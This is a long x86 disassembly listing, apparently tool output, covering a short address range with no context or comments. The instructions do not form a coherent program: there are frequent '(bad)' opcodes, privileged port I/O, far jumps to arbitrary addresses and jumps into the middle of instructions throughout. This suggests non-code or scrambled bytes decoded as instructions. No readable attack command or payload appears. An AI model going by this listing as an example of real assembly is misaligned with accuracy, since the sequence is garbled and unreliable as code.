  41074c:	hlt    
  41074d:	sub    DWORD PTR [eax+0x5c454e4],ecx
  410753:	or     bh,BYTE PTR [edi+0x387a82b3]
  410759:	loop   0x4107da
  41075b:	mov    al,ds:0xedab6f9a
  410760:	data16 xchg BYTE PTR [ecx-0x4ec06a0f],bl
  410767:	(bad)  
  410768:	mov    al,0x26
  41076a:	ror    DWORD PTR [ebx+0x6e],cl
  41076d:	loop   0x41072d
  41076f:	sahf   
  410770:	call   0x6597:0xc380a74d
  410777:	push   esi
  410778:	xor    al,0x98
  41077a:	je     0x41070c
  41077c:	or     bh,bl
  41077e:	mov    al,0x85
  410780:	push   0xffffff88
  410782:	ret    
  410783:	arpl   WORD PTR [ebx-0x548f40dc],bp
  410789:	mov    bl,0x8c
  41078b:	shl    DWORD PTR [eax],cl
  41078d:	into   
  41078e:	sbb    BYTE PTR [ebp+esi*2-0x407f812d],dl
  410795:	sub    esp,DWORD PTR [eax+0x63]
  410798:	std    
  410799:	popf   
  41079a:	adc    dl,BYTE PTR [eax+0x51]
  41079d:	mov    ecx,0x8065108b
  4107a2:	test   al,0x3f
  4107a4:	lds    ecx,FWORD PTR [eax]
  4107a6:	rol    BYTE PTR [eax],0x7a
  4107a9:	adc    cl,BYTE PTR [eax]
  4107ab:	inc    edx
  4107ac:	and    al,0xc2
  4107ae:	ins    DWORD PTR es:[edi],dx
  4107af:	sahf   
  4107b0:	mov    ecx,0x1a62d2d3
  4107b5:	out    0xa8,eax
  4107b7:	ins    BYTE PTR es:[edi],dx
  4107b8:	out    dx,al
  4107b9:	js     0x4107d2
  4107bb:	aad    0x5a
  4107bd:	pusha  
  4107be:	mov    ah,0xc7
  4107c0:	mov    esi,0xaf92b66a
  4107c5:	test   eax,0xec7484a
  4107ca:	push   esp
  4107cb:	mov    bh,0xd3
  4107cd:	jo     0x4107fa
  4107cf:	aad    0x1b
  4107d1:	push   edx
  4107d2:	std    
  4107d3:	xchg   esp,eax
  4107d4:	pop    esi
  4107d5:	sub    ebp,eax
  4107d7:	sbb    al,cl
  4107d9:	imul   esp,DWORD PTR ds:0xee749776,0xffffffd9
  4107e0:	jb     0x4107ce
  4107e2:	or     al,0x61
  4107e4:	data16 das 
  4107e6:	in     al,dx
  4107e7:	pop    esp
  4107e8:	push   ebp
  4107e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ea:	mov    BYTE PTR [eax+ebx*2-0x1f],bl
  4107ee:	icebp  
  4107ef:	and    BYTE PTR [esi+0x40],bl
  4107f2:	xchg   esi,eax
  4107f3:	int    0xb7
  4107f5:	dec    edx
  4107f6:	ins    DWORD PTR es:[edi],dx
  4107f7:	sub    eax,0xe0c0bac6
  4107fc:	ror    BYTE PTR [edx-0x30b7f1a2],1
  410802:	jne    0x410793
  410804:	sbb    ebx,ebp
  410806:	jo     0x41081e
  410808:	xchg   bh,ah
  41080a:	sahf   
  41080b:	cmp    BYTE PTR [edx-0x3c],dh
  41080e:	xor    eax,esp
  410810:	push   edi
  410811:	out    dx,al
  410812:	mov    BYTE PTR [ecx+0x5e],0x74
  410816:	push   ds
  410817:	es jns 0x4107f6
  41081a:	aad    0x49
  41081c:	jg     0x4107a0
  41081e:	and    BYTE PTR [ebx+ebx*1],0xe4
  410822:	pop    ecx
  410823:	xchg   esi,eax
  410824:	adc    BYTE PTR [edx+0x793cc840],0x62
  41082b:	and    ch,BYTE PTR [ebx-0x2]
  41082e:	xor    ecx,DWORD PTR [ebx-0x3ff6d21a]
  410834:	mov    DWORD PTR [eax+ebx*1],esi
  410837:	(bad)  
  410838:	(bad)  
  410839:	imul   ebp,edx,0xe6d4cbeb
  41083f:	xchg   DWORD PTR [edx-0x4c7c33aa],esp
  410845:	(bad)  
  410846:	xchg   ebp,eax
  410847:	scas   al,BYTE PTR es:[edi]
  410848:	push   ss
  410849:	xchg   edx,eax
  41084a:	adc    BYTE PTR [eax],cl
  41084c:	aad    0x7e
  41084e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41084f:	std    
  410850:	pop    ecx
  410851:	inc    esi
  410852:	jmp    0xce1b562f
  410857:	mov    bl,0xb6
  410859:	push   edx
  41085a:	(bad)  
  41085b:	sub    eax,0x5c85cfff
  410860:	pusha  
  410861:	call   0x6201:0xf0e75576
  410868:	xor    ecx,DWORD PTR [ebx]
  41086a:	(bad)  
  41086b:	push   eax
  41086c:	lea    edx,[ebx-0x26]
  41086f:	mov    esi,0x98641b3b
  410874:	inc    ebp
  410875:	test   DWORD PTR [ecx-0xd2967a0],edi
  41087b:	fstp   TBYTE PTR [esi+0x382cec6b]
  410881:	sub    edi,DWORD PTR [esi-0x55]
  410884:	sbb    eax,0x8e2a9967
  410889:	push   eax
  41088a:	xchg   edx,eax
  41088b:	mov    dl,0xb8
  41088d:	outs   dx,BYTE PTR ds:[esi]
  41088e:	sub    edx,ebx
  410890:	das    
  410891:	pop    ss
  410892:	mov    BYTE PTR [ecx-0x71],bl
  410895:	mov    BYTE PTR [ebp+0x21],dh
  410898:	in     al,0xdf
  41089a:	shl    BYTE PTR [edx],0x6f
  41089d:	outs   dx,DWORD PTR ds:[si]
  41089f:	iret   
  4108a0:	adc    DWORD PTR [ebp-0x7b2b7eab],esi
  4108a6:	mov    edi,0xda05777c
  4108ab:	cmp    dh,0xa5
  4108ae:	and    esi,DWORD PTR [ecx]
  4108b0:	or     bh,BYTE PTR [edx-0x20498f4b]
  4108b6:	ror    DWORD PTR [eax],cl
  4108b8:	cmp    bh,dh
  4108ba:	fild   QWORD PTR [eax-0x6f]
  4108bd:	in     al,dx
  4108be:	sub    esi,DWORD PTR [eax-0x46]
  4108c1:	push   ss
  4108c2:	and    ebp,ebp
  4108c4:	pusha  
  4108c5:	pop    ebp
  4108c6:	inc    ebx
  4108c7:	(bad)  
  4108c8:	xchg   ecx,eax
  4108c9:	loopne 0x41091c
  4108cb:	inc    edx
  4108cc:	iret   
  4108cd:	loop   0x410942
  4108cf:	inc    edi
  4108d0:	sbb    BYTE PTR [ebp-0x65],al
  4108d3:	pop    esi
  4108d4:	mov    gs,WORD PTR [edi-0x33]
  4108d7:	rcl    DWORD PTR fs:[ebx+ebx*8],cl
  4108db:	cmp    BYTE PTR [ebp+0x1a7c2d49],0xd4
  4108e2:	and    eax,edx
  4108e4:	inc    esi
  4108e5:	fdivr  QWORD PTR [ebx+0x2d]
  4108e8:	mov    ebp,0x9462c09d
  4108ed:	adc    eax,0x14ba94e8
  4108f2:	sub    al,0xa9
  4108f4:	push   eax
  4108f5:	and    DWORD PTR [edi+0x57],ecx
  4108f8:	push   esi
  4108f9:	aam    0xaf
  4108fb:	cmp    BYTE PTR [edi],bl
  4108fd:	loopne 0x4108cc
  4108ff:	stos   DWORD PTR es:[edi],eax
  410900:	stc    
  410901:	xor    DWORD PTR [edi-0x42],edi
  410904:	mov    esi,0xb0485445
  410909:	xchg   ebx,eax
  41090a:	js     0x41091c
  41090c:	adc    DWORD PTR [ebx],esp
  41090e:	sub    al,BYTE PTR [eax+0x74d18fc2]
  410914:	retf   
  410915:	fimul  WORD PTR [eax-0x39bfaa7e]
  41091b:	mov    eax,ds:0xac938447
  410920:	adc    edi,DWORD PTR [edi+0x57]
  410923:	mov    ebx,DWORD PTR [edi+ecx*4]
  410926:	(bad)  
  410927:	es or  al,0xda
  41092a:	sub    DWORD PTR [ebp+ebx*4-0x53c51667],0x69255b9c
  410935:	dec    ecx
  410936:	sbb    DWORD PTR [esi+0x5a],eax
  410939:	(bad)  
  41093a:	sub    al,BYTE PTR [edx]
  41093c:	mov    edx,0xe3b842cf
  410941:	jmp    0x3a30:0x28a80fa0
  410948:	xchg   ecx,eax
  410949:	clc    
  41094a:	iret   
  41094b:	adc    eax,ecx
  41094d:	outs   dx,DWORD PTR ds:[esi]
  41094e:	mov    cl,0x54
  410950:	and    al,0x6c
  410952:	xchg   esp,eax
  410953:	inc    esi
  410954:	sub    eax,eax
  410956:	fcomp  DWORD PTR [ebp+0xa]
  410959:	div    edx
  41095b:	sbb    edi,DWORD PTR [eax-0x5b]
  41095e:	adc    eax,DWORD PTR [ebx+ecx*8-0x81efae]
  410965:	cmp    edx,DWORD PTR [eax-0x67]
  410968:	loope  0x4108f0
  41096a:	inc    edx
  41096b:	xor    al,0x7d
  41096d:	sub    BYTE PTR [ecx+eiz*2+0x28b0fc52],0x9a
  410975:	pusha  
  410976:	pop    ebp
  410977:	ror    ah,0x71
  41097a:	scas   eax,DWORD PTR es:[edi]
  41097b:	push   edi
  41097c:	cmp    al,ah
  41097e:	les    ebx,FWORD PTR [ebx]
  410980:	inc    eax
  410981:	or     dl,dl
  410983:	push   esi
  410984:	out    dx,eax
  410985:	cmp    BYTE PTR [ebp+0x49],ah
  410988:	fadd   QWORD PTR [edi]
  41098a:	jp     0x4109ed
  41098c:	ja     0x4109f0
  41098e:	or     eax,0x2d6f9df4
  410993:	bound  eax,QWORD PTR [ebx]
  410995:	xchg   ecx,eax
  410996:	pop    ss
  410997:	jge    0x410967
  410999:	or     DWORD PTR [edi-0xf40644d],esi
  41099f:	iret   
  4109a0:	mov    esi,0x99b44f22
  4109a5:	adc    edx,DWORD PTR [edi-0x20]
  4109a8:	inc    eax
  4109a9:	enter  0xb394,0x6f
  4109ad:	iret   
  4109ae:	ins    DWORD PTR es:[edi],dx
  4109af:	add    DWORD PTR [edi+esi*1-0x62ff360f],esp
  4109b6:	bswap  edx
  4109b8:	std    
  4109b9:	aam    0xb4
  4109bb:	aam    0x2b
  4109bd:	push   0x69
  4109bf:	test   al,0xf8
  4109c1:	pop    ecx
  4109c2:	shl    DWORD PTR [ebx+0x20],1
  4109c5:	push   ebx
  4109c6:	pop    ds
  4109c7:	(bad)  
  4109c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109c9:	mov    esi,ebp
  4109cb:	pushf  
  4109cc:	or     DWORD PTR [eax],edx
  4109ce:	clc    
  4109cf:	or     DWORD PTR [ebx+0x3d],ebx
  4109d2:	xor    eax,DWORD PTR [edx-0xe85ba74]
  4109d8:	cmp    BYTE PTR [eax-0xc],ah
  4109db:	inc    ebx
  4109dc:	and    al,0xe
  4109de:	push   cs
  4109df:	and    BYTE PTR [esp+ebp*2-0x7d3e0f34],al
  4109e6:	pusha  
  4109e7:	lods   al,BYTE PTR ds:[esi]
  4109e8:	dec    edx
  4109e9:	shl    DWORD PTR [ebp+ebp*1+0x37fafe70],cl
  4109f0:	sti    
  4109f1:	xchg   BYTE PTR ds:0xcfc6cdc7,bl
  4109f7:	fdiv   DWORD PTR [ebx+ebx*8]
  4109fa:	jge    0x410a39
  4109fc:	std    
  4109fd:	(bad)  [ecx]
  4109ff:	out    0x4d,al
  410a01:	dec    esp
  410a02:	push   esi
  410a03:	stc    
  410a04:	frstor [edx-0x2e]
  410a07:	es loope 0x410a7c
  410a0a:	inc    eax
  410a0b:	or     BYTE PTR [ecx],dl
  410a0d:	pop    edx
  410a0e:	out    0xb8,eax
  410a10:	imul   edx,DWORD PTR [ebx+0x7df91080],0xc2a0e4f4
  410a1a:	imul   ebp,DWORD PTR [ecx+0xb95ded6],0x6253b0cc
  410a24:	cli    
  410a25:	rol    DWORD PTR [ebx-0x3c1b6626],cl
  410a2b:	inc    eax
  410a2c:	sub    eax,DWORD PTR [esi+0x11]
  410a2f:	cmp    BYTE PTR [eax+0x6b],dh
  410a32:	xor    eax,0x4f14b6fa
  410a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a38:	(bad)  
  410a39:	out    dx,eax
  410a3a:	adc    DWORD PTR ds:0x9580a9e6,ebx
  410a40:	sub    ch,BYTE PTR [ebp-0x24]
  410a43:	inc    ecx
  410a44:	jle    0x410abc
  410a46:	jb     0x410a6e
  410a48:	and    eax,0xdbbdf6ec
  410a4d:	std    
  410a4e:	cs aaa 
  410a50:	sbb    ecx,DWORD PTR [eax-0x4ae3e399]
  410a56:	(bad)  
  410a57:	jne    0x410a69
  410a59:	or     eax,0x16c2fce8
  410a5e:	adc    DWORD PTR [edx],edx
  410a60:	cmc    
  410a61:	cdq    
  410a62:	inc    esp
  410a63:	(bad)  
  410a64:	sub    al,0x75
  410a66:	inc    esp
  410a67:	mov    ecx,0xf64d2f82
  410a6c:	es jnp 0x410a03
  410a6f:	jns    0x410a31
  410a71:	sbb    DWORD PTR [edi+0x7f],esi
  410a74:	in     al,dx
  410a75:	fldenv [ebx]
  410a77:	(bad)  
  410a79:	mov    eax,ds:0x55a841b9
  410a7e:	pop    edx
  410a7f:	inc    edx
  410a80:	fldlg2 
  410a82:	test   BYTE PTR [ebx+0x23f64a6f],dl
  410a88:	sahf   
  410a89:	test   eax,0xcde4058d
  410a8e:	dec    bl
  410a90:	sub    esi,DWORD PTR [ebp-0x3]
  410a93:	sar    BYTE PTR [edi-0x64136391],0xec
  410a9a:	leave  
  410a9b:	int    0x14
  410a9d:	pusha  
  410a9e:	mov    dh,0xcd
  410aa0:	sbb    DWORD PTR [esi+edi*8+0x5f],esi
  410aa4:	push   ecx
  410aa5:	or     BYTE PTR [ebp-0x48f4ee7b],al
  410aab:	int    0x35
  410aad:	pusha  
  410aae:	ret    0x5f57
  410ab1:	loope  0x410af7
  410ab3:	xor    DWORD PTR [ecx+ebp*8+0x7a2d0a95],edx
  410aba:	inc    edx
  410abb:	adc    eax,0xc93886b8
  410ac0:	jne    0x410a4b
  410ac2:	add    bl,BYTE PTR [edx-0x74154c4c]
  410ac8:	popa   
  410ac9:	mov    WORD PTR [edi-0x57de6f3f],ds
  410acf:	sub    eax,0xf27e0582
  410ad4:	out    dx,eax
  410ad5:	xor    eax,0xfa4a4153
  410ada:	dec    esp
  410adb:	push   es
  410adc:	retf   0x9e5b
  410adf:	ja     0x410aac
  410ae1:	cmp    dl,BYTE PTR [ecx-0x78a4a867]
  410ae7:	xor    cl,cl
  410ae9:	sbb    eax,0x85432b05
  410aee:	das    
  410aef:	lds    eax,FWORD PTR [ecx-0x5c]
  410af2:	inc    edx
  410af3:	add    eax,0xacea2531
  410af8:	lods   eax,DWORD PTR ds:[esi]
  410af9:	dec    ecx
  410afa:	push   ss
  410afb:	xor    DWORD PTR [edi],ecx
  410afd:	or     edx,DWORD PTR [esi+0x66c0e1e4]
  410b03:	xor    al,0x69
  410b05:	test   BYTE PTR [edi+0x1afcfa3a],ah
  410b0b:	push   es
  410b0c:	cmp    al,0x7b
  410b0e:	sub    BYTE PTR [edx+0x5d],bh
  410b11:	pop    edi
  410b12:	mov    ah,0x3e
  410b14:	into   
  410b15:	scas   eax,DWORD PTR es:[edi]
  410b16:	mov    esp,0xd3402972
  410b1b:	adc    edi,DWORD PTR [ebp-0x7245819f]
  410b21:	xor    eax,0xa15db790
  410b26:	scas   al,BYTE PTR es:[edi]
  410b27:	sahf   
  410b28:	call   0xa28b2bb
  410b2d:	arpl   WORD PTR [edi-0x56400fa4],dx
  410b33:	xchg   dh,ch
  410b35:	mov    gs,WORD PTR [ebp-0x5e]
  410b38:	sbb    eax,0x306a13ca
  410b3d:	dec    eax
  410b3e:	push   ecx
  410b3f:	jmp    0x410b4a
  410b41:	pushf  
  410b42:	repz mov eax,0xdc482747
  410b48:	mov    esp,0x8976a94c
  410b4d:	mov    DWORD PTR [eax],0xe8be0955
  410b53:	xchg   esp,eax
  410b54:	xchg   edx,eax
  410b55:	retf   
  410b56:	xchg   BYTE PTR ds:0xf2e77dc2,bl
  410b5c:	es jecxz 0x410bb3
  410b5f:	(bad)  
  410b60:	pop    ds
  410b61:	push   eax
  410b62:	sub    BYTE PTR [ebp+0x21],ch
  410b65:	sub    edx,edi
  410b67:	jl     0x410b48
  410b69:	not    eax
  410b6b:	fimul  WORD PTR [edi]
  410b6d:	ins    DWORD PTR es:[edi],dx
  410b6e:	mov    ebx,0xba708d9f
  410b73:	sti    
  410b74:	cs rcr esi,1
  410b77:	lahf   
  410b78:	out    dx,eax
  410b79:	jmp    0x11dd1d1f
  410b7e:	add    ch,0xf5
  410b81:	cli    
  410b82:	ins    DWORD PTR es:[edi],dx
  410b83:	je     0x410b8e
  410b85:	ja     0x410b9b
  410b87:	lods   al,BYTE PTR ds:[esi]
  410b88:	fcmovbe st,st(7)
  410b8a:	and    esp,DWORD PTR [esi+eax*8]
  410b8d:	repnz xor esp,DWORD PTR [ebp+esi*1-0x5]
  410b92:	jg     0x410be6
  410b94:	jnp    0x410c0c
  410b96:	mov    ch,0x6c
  410b98:	aad    0xa3
  410b9a:	dec    ebx
  410b9b:	jns    0x410b74
  410b9d:	inc    edi
  410b9e:	in     al,dx
  410b9f:	aaa    
  410ba0:	pushf  
  410ba1:	hlt    
  410ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ba3:	popf   
  410ba4:	or     DWORD PTR [edx],ebp
  410ba6:	rcr    esi,1
  410ba8:	cwde   
  410ba9:	dec    esi
  410baa:	sbb    ebp,DWORD PTR es:[ebx]
  410bad:	aam    0x4f
  410baf:	pop    eax
  410bb0:	inc    ebp
  410bb1:	and    dl,BYTE PTR ds:0xd1ed39b6
  410bb7:	out    0xc0,eax
  410bb9:	jnp    0x410c1f
  410bbb:	ret    0x571b
  410bbe:	inc    edx
  410bbf:	pop    edx
  410bc0:	pop    esi
  410bc1:	dec    esi
  410bc2:	mov    ecx,0x703cdc09
  410bc7:	gs cmp ecx,esp
  410bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bcb:	lods   eax,DWORD PTR ds:[esi]
  410bcd:	xor    DWORD PTR [esi],0x13
  410bd0:	in     eax,0x73
  410bd2:	cmp    bh,0x40
  410bd5:	or     BYTE PTR [esi-0x120a46dd],bh
  410bdb:	and    esp,edi
  410bdd:	call   DWORD PTR [edx+0x61]
  410be0:	test   edx,ebp
  410be2:	(bad)  
  410be4:	scas   eax,DWORD PTR es:[edi]
  410be5:	push   ds
  410be6:	sub    eax,0xa772d9bb
  410beb:	mov    ebp,0xec70e653
  410bf0:	or     eax,0x6ab651a9
  410bf5:	retf   
  410bf6:	ret    0x50e7
  410bf9:	in     al,dx
  410bfa:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  410bfc:	xor    al,0x34
  410bfe:	cwde   
  410bff:	call   0x9c2c4208
  410c04:	and    eax,0xc346571e
  410c09:	jl     0x410c37
  410c0b:	xor    al,0x73
  410c0d:	xchg   BYTE PTR [ebx-0x5e],dl
  410c10:	dec    edi
  410c11:	mov    BYTE PTR [edi],cl
  410c13:	sti    
  410c14:	xor    al,0xb3
  410c16:	xlat   BYTE PTR ds:[ebx]
  410c17:	adc    BYTE PTR [eax+eiz*4],dl
  410c1a:	sub    esi,edi
  410c1c:	mov    DWORD PTR [esi],esp
  410c1e:	(bad)  
  410c1f:	inc    edx
  410c20:	repz inc ecx
  410c22:	call   0x3cebb3da
  410c27:	mov    ds:0xecedd36c,al
  410c2c:	pusha  
  410c2d:	xchg   edi,eax
  410c2e:	pop    ss
  410c2f:	sbb    edx,DWORD PTR [edi-0x7071bd64]
  410c35:	enter  0x76c6,0x8f
  410c39:	leave  
  410c3a:	push   ss
  410c3b:	pop    es
  410c3c:	aam    0x89
  410c3e:	mov    esi,0x625105af
  410c43:	push   ds
  410c44:	not    DWORD PTR [esi+0x5]
  410c47:	pop    es
  410c48:	inc    eax
  410c49:	faddp  st(0),st
  410c4b:	fs int3 
  410c4d:	or     ah,BYTE PTR [ecx]
  410c4f:	add    al,BYTE PTR [esi-0x3a]
  410c52:	xor    BYTE PTR [esi+0x42],al
  410c55:	fidivr WORD PTR [eax+0x33]
  410c58:	lds    edx,FWORD PTR [edi+0x3a68a793]
  410c5e:	daa    
  410c5f:	fstp   st(1)
  410c61:	lahf   
  410c62:	lahf   
  410c63:	mov    ?,WORD PTR [ebx]
  410c65:	lods   al,BYTE PTR ds:[esi]
  410c66:	add    eax,0x75b4c824
  410c6b:	sbb    BYTE PTR [edx+0x26],dh
  410c6e:	mov    edi,0xdc94f34c
  410c73:	div    BYTE PTR cs:[ebx+0x75]
  410c77:	dec    ebx
  410c78:	add    al,0x5b
  410c7a:	pop    ebp
  410c7b:	mov    ebx,0x7e2deeac
  410c80:	addr16 xor ch,cl
  410c83:	fldenv [ebp-0x25]
  410c86:	pop    ebx
  410c87:	xor    edi,edi
  410c89:	pop    edx
  410c8a:	in     al,dx
  410c8b:	sbb    al,0x75
  410c8d:	daa    
  410c8e:	aad    0xfd
  410c90:	or     BYTE PTR [edi-0x417e8cbd],dh
  410c96:	dec    ebp
  410c97:	dec    ebx
  410c98:	jmp    0x48e2:0xed42b25a
  410c9f:	in     al,0x1d
  410ca1:	fcom   DWORD PTR [eax]
  410ca3:	mov    ds:0x66eb3499,al
  410ca8:	mov    ah,0xd9
  410caa:	enter  0xe8f2,0x9e
  410cae:	ror    BYTE PTR [ebp+0x30],1
  410cb1:	(bad)  
  410cb2:	loope  0x410c58
  410cb4:	dec    ebx
  410cb5:	xlat   BYTE PTR ds:[ebx]
  410cb6:	sbb    edi,eax
  410cb8:	je     0x410c5a
  410cba:	cmp    edx,edx
  410cbc:	lock mov BYTE PTR [ebx+0x6e4a1bb8],al
  410cc3:	xor    al,0xaf
  410cc5:	inc    BYTE PTR [edi+0x64]
  410cc8:	ror    dl,0x1d
  410ccb:	(bad)  
  410ccc:	and    DWORD PTR [eax-0x79],esi
  410ccf:	mov    ecx,0x3081f417
  410cd4:	mov    DWORD PTR [ecx+esi*4+0x32],eax
  410cd8:	ret    
  410cd9:	mov    ds:0xb07ede21,eax
  410cde:	outs   dx,BYTE PTR ds:[esi]
  410ce0:	test   al,0xa0
  410ce2:	sbb    BYTE PTR [edi+0x489be879],ah
  410ce8:	jae    0x410d59
  410cea:	loop   0x410d2e
  410cec:	sar    DWORD PTR [edx-0x72],cl
  410cef:	cmp    al,0x25
  410cf1:	test   BYTE PTR [esp+ebx*1],cl
  410cf4:	cmp    BYTE PTR [edi],ah
  410cf6:	ror    DWORD PTR [esi+0x11],cl
  410cf9:	or     cl,BYTE PTR [esp+edx*2-0x58]
  410cfd:	pop    es
  410cfe:	fdivr  st,st(1)
  410d00:	sbb    esp,DWORD PTR [ebp+esi*8+0x33]
  410d04:	pop    eax
  410d05:	mov    ch,0x6b
  410d07:	dec    BYTE PTR [eiz*8+0x7b5d2059]
  410d0e:	test   DWORD PTR [edx+0x2],ebx
  410d11:	or     al,0x42
  410d13:	or     DWORD PTR [edx],ecx
  410d15:	dec    edi
  410d16:	dec    ecx
  410d17:	fwait
  410d18:	pusha  
  410d19:	push   0x78
  410d1b:	jmp    0x410cdb
  410d1d:	test   eax,0x1b4b6c85
  410d22:	neg    BYTE PTR [eax-0x6882dab3]
  410d28:	les    edi,FWORD PTR [ebp+0x5d]
  410d2b:	fsubr  QWORD PTR [edx-0x7b9bacc3]
  410d31:	popa   
  410d32:	mov    ebp,0x663bac0d
  410d37:	unpckhps xmm4,xmm6
  410d3a:	jb     0x410d33
  410d3c:	jo     0x410d8f
  410d3e:	rcr    DWORD PTR [ebx+0x78],0x63
  410d42:	lods   al,BYTE PTR ds:[esi]
  410d43:	inc    esp
  410d44:	dec    ebx
  410d45:	out    0x10,al
  410d47:	and    dh,BYTE PTR [ebx+0x1]
  410d4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d4b:	ja     0x410d9e
  410d4d:	jmp    0x410daf
  410d4f:	xor    DWORD PTR [edi],0x5e
  410d52:	mov    esi,DWORD PTR [ebp+edx*2-0xb79fef2]
  410d59:	ds ins DWORD PTR es:[edi],dx
  410d5b:	or     al,0x76
  410d5d:	pop    ds
  410d5e:	pop    ebp
  410d5f:	popa   
  410d60:	mov    al,ds:0x630543e
  410d65:	sbb    cl,BYTE PTR ss:[edi]
  410d68:	fimul  WORD PTR [eax+edi*1+0x3c]
  410d6c:	push   edx
  410d6d:	fisttp QWORD PTR [eax-0x9]
  410d70:	pop    ss
  410d71:	push   esp
  410d72:	xchg   edx,eax
  410d73:	cmp    BYTE PTR [esi+0x20c3fc5],bh
  410d79:	dec    eax
  410d7a:	adc    BYTE PTR [edx+0x74214d01],cl
  410d80:	ror    dh,1
  410d82:	jmp    0xff09:0xcde2c0b
  410d89:	test   al,0x71
  410d8b:	out    dx,al
  410d8c:	pop    es
  410d8d:	push   edx
  410d8e:	fisub  WORD PTR [esi]
  410d90:	pop    esi
  410d91:	adc    BYTE PTR [ecx+edx*2-0x80],0x1f
  410d96:	add    eax,0x7026e14f
  410d9b:	and    al,0xe
  410d9d:	push   es
  410d9e:	mov    ebx,0x2f3230a7
  410da3:	sti    
  410da4:	icebp  
  410da5:	daa    
  410da6:	out    dx,al
  410da7:	push   ds
  410da8:	jmp    0x7dfb1aff
  410dad:	loope  0x410d64
  410daf:	mov    bl,BYTE PTR [eax-0x4a]
  410db2:	add    bl,BYTE PTR [edi+0x65]
  410db5:	fcmovne st,st(7)
  410db7:	into   
  410db8:	mov    dh,BYTE PTR [ecx-0x2d]
  410dbb:	cld    
  410dbc:	cmc    
  410dbd:	cs dec esi
  410dbf:	pextrw eax,(bad),0xc5
  410dc1:	inc    edx
  410dc2:	shl    DWORD PTR [ecx+edx*4-0x2c],1
  410dc6:	mov    ds:0xc9789ce9,eax
  410dcb:	xchg   ecx,eax
  410dcc:	push   edi
  410dcd:	jp     0x410de5
  410dcf:	cmc    
  410dd0:	shl    DWORD PTR [esi-0x6d],1
  410dd3:	adc    eax,0x14c295e
  410dd8:	pop    ebx
  410dd9:	ss add ebx,ecx
  410ddc:	push   ds
  410ddd:	adc    eax,DWORD PTR [ebx]
  410ddf:	mov    cl,0x50
  410de1:	ret    0x2ca6
  410de4:	mov    al,0xa
  410de6:	mov    esp,DWORD PTR [edx-0x2f8d4e7]
  410dec:	out    dx,al
  410ded:	cdq    
  410dee:	push   ds
  410def:	pop    ecx
  410df0:	xchg   edx,eax
  410df1:	sub    ebx,esi
  410df3:	inc    esi
  410df4:	dec    ebx
  410df5:	inc    ebp
  410df6:	jne    0x410d99
  410df8:	jns    0x410dfa
  410dfa:	mov    ch,al
  410dfc:	mov    ebp,0x5199bb3c
  410e01:	lods   al,BYTE PTR ds:[esi]
  410e02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e03:	jns    0x410e62
  410e05:	adc    esp,DWORD PTR [esi]
  410e07:	test   DWORD PTR [eax-0x2985243f],0x4df1fd2
  410e11:	jnp    0x410e27
  410e13:	cld    
  410e14:	sub    ch,BYTE PTR ds:0xe12abb1f
  410e1a:	and    al,0x78
  410e1c:	sar    BYTE PTR [esi+0x71],cl
  410e1f:	and    DWORD PTR [eax+0x3e884dc3],esi
  410e25:	out    0xef,al
  410e27:	xor    al,0x8b
  410e29:	fidivr WORD PTR [eax+0xe91ce02]
  410e2f:	aas    
  410e30:	(bad)  
  410e31:	fsubr  QWORD PTR [ebp-0x4eef3857]
  410e37:	scas   al,BYTE PTR es:[edi]
  410e38:	adc    ch,ch
  410e3a:	cli    
  410e3b:	inc    esi
  410e3c:	sbb    al,BYTE PTR [ebx-0x49364f58]
  410e42:	push   ss
  410e43:	push   ebp
  410e44:	(bad)
  410e47:	adc    al,0x54
  410e49:	dec    ebp
  410e4a:	repz cli 
  410e4c:	into   
  410e4d:	mov    esi,0x60c3da9a
  410e52:	xchg   ebx,eax
  410e53:	daa    
  410e54:	push   ecx
  410e55:	sub    eax,0x8ef18e31
  410e5a:	outs   dx,DWORD PTR ds:[esi]
  410e5b:	inc    ebx
  410e5c:	hlt    
  410e5d:	inc    esi
  410e5e:	and    DWORD PTR ds:0x1340e0d4,ebx
  410e64:	pop    ss
  410e65:	(bad)  
  410e66:	call   0x7eb2895d
  410e6b:	(bad)  
  410e6c:	jmp    0x56b5:0xa8beb79e
  410e73:	int3   
  410e74:	mov    edi,DWORD PTR [esi+0x42]
  410e77:	inc    edi
  410e78:	pushf  
  410e79:	pop    edx
  410e7a:	pop    ebp
  410e7b:	pop    ds
  410e7c:	mov    ecx,0x739b6b49
  410e81:	outs   dx,DWORD PTR es:[esi]
  410e83:	lock call 0x970ee05
  410e89:	aad    0xa8
  410e8b:	pushf  
  410e8c:	jo     0x410efa
  410e8e:	in     eax,0x5
  410e90:	inc    esp
  410e91:	jne    0x410e93
  410e93:	iret   
  410e94:	xchg   esp,eax
  410e95:	and    eax,0x44c912f9
  410e9a:	lahf   
  410e9b:	test   bh,bl
  410e9d:	mov    BYTE PTR [eax+0x4755723b],al
  410ea3:	xchg   cl,bl
  410ea5:	test   eax,0x3aa0f2af
  410eaa:	inc    esi
  410eab:	stos   DWORD PTR es:[edi],eax
  410eac:	mov    dl,0x1b
  410eae:	lea    edi,[edi]
  410eb0:	xchg   ecx,eax
  410eb1:	push   es
  410eb2:	sub    ebx,DWORD PTR [ecx]
  410eb4:	mov    edi,0xb9b51549
  410eb9:	cli    
  410eba:	bswap  esp
  410ebc:	dec    esi
  410ebd:	xor    ecx,DWORD PTR [ecx+0x48fc9a7]
  410ec3:	sbb    bl,cl
  410ec5:	sbb    eax,0x26691c13
  410eca:	adc    DWORD PTR [eax-0x6fa51dea],ecx
  410ed0:	inc    edi
  410ed1:	sti    
  410ed2:	std    
  410ed3:	xchg   edi,eax
  410ed4:	and    esi,DWORD PTR [eax+0x37]
  410ed7:	jle    0x410e6c
  410ed9:	cmp    eax,edi
  410edb:	clc    
  410edc:	jae    0x410ea3
  410ede:	dec    edi
  410edf:	ins    DWORD PTR es:[edi],dx
  410ee0:	xor    BYTE PTR [edi-0x5797ce69],0x82
  410ee7:	mov    WORD PTR [eax+ebx*8-0x49f4a324],ss
  410eee:	ds aad 0x5
  410ef1:	jbe    0x410e9a
  410ef3:	inc    edi
  410ef4:	test   ecx,esp
